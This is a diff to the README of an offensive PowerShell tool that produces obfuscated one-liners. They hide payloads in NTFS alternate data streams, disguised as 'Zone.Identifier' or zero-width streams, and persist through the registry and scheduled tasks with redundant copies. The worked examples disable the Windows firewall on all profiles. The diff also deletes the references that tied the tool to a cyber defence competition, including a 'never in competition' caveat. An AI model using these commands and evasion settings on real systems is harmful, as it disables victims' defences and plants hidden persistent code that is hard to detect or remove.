@@ -30,7 +30,7 @@ pwsh src/ADS-OneLiner.ps1 \
   -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
   -OutputFile /tmp/fw-off.txt
 
-# 2. Standard CCDC op — Advanced tier, registry persist, 3 redundant instances
+# 2. Standard — Advanced stealth, registry persist, 3 redundant instances
 pwsh src/ADS-OneLiner.ps1 \
   -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
   -Obfuscate Advanced \
@@ -46,7 +46,7 @@ pwsh src/ADS-OneLiner.ps1 \
   -OutputFile /tmp/paranoid.txt
 ```
 
-Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file into PowerShell as Administrator.
+Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file into PowerShell as Administrator (for task/system level persistence).
 
 ---
 
@@ -58,7 +58,7 @@ Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file 
 |-----------|------|---------|-------------|
 | **Payload Input** | | | |
 | `-Payload 'cmd'` | string | — | Inline PowerShell. Use single quotes in bash. |
-| `-PayloadFile /path` | string | — | Read payload from file. Best for `$variables`. |
+| `-PayloadFile /path` | string | — | Read payload from file. Best for `$variables` and multi-line payloads. |
 | `-PayloadAtDeployment` | switch | off | Prompt for payload on Windows target at paste time. |
 | **Stealth Tier** | | | |
 | `-Obfuscate None\|Basic\|Advanced\|Paranoid` | string | `Advanced` | See tier table below. Controls encryption, placement, stream naming. |
@@ -110,9 +110,9 @@ The `-Obfuscate` parameter is the primary control. Most evasion parameters are i
 
 | Tier | Task/File Names | ADS Placement | Stream Name | ZW Streams | Encrypt | When to Use |
 |------|-----------------|---------------|-------------|------------|---------|-------------|
-| `None` | Fixed: `SystemOptimization` | `C:\ProgramData\` | `payload` | No | No | **Testing only. Never in competition.** |
+| `None` | Fixed: `SystemOptimization` | `C:\ProgramData\` | `payload` | No | No | **Testing only.** |
 | `Basic` | Word-list random | `C:\ProgramData\` | Random 8 chars | No | No | Quick deployment, acceptable stealth. |
-| `Advanced` | Word-list random | WER\Cache, Diagnosis | **`Zone.Identifier`** | No | **Yes** | **Default. Standard CCDC.** |
+| `Advanced` | Word-list random | WER\Cache, Diagnosis | **`Zone.Identifier`** | No | **Yes** | **Default.** |
 | `Paranoid` | Word-list random | WER\Cache + attach | **`$Data`+ZW** | **Yes** | **Yes** | Max stealth. Harder to clean up. |
 
 **v2.5 tier-implied defaults:**
